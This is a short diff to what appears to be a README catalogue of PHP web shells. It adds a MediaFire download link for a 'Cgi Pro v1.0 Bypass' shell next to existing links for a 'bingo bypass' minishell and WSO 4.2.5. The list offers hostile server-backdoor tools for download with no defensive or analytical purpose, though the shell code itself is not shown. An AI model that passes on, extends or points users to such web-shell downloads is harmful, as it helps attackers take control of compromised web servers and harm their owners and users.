@@ -27,6 +27,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/nk719iyy6976ez0/bingo-bypass_minishell.php/file">Bingo bypass</a>
 <img src="https://imgur.com/9sijhP0.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/0q5a2sseqhmcm68/cgipro-bypass_shell.php/file">Cgi Pro v1.0 Bypass</a>
+<img src="https://imgur.com/sfFBeXY.png" alt="beruangsalju profile">
+  
 # <a href="https://www.mediafire.com/file/e3pdhtmvmifkzm7/wso-4.2.5_shell.php/file">WSO-4.2.5</a>
 <img src="https://imgur.com/K4PAR3c.png" alt="beruangsalju profile">
 
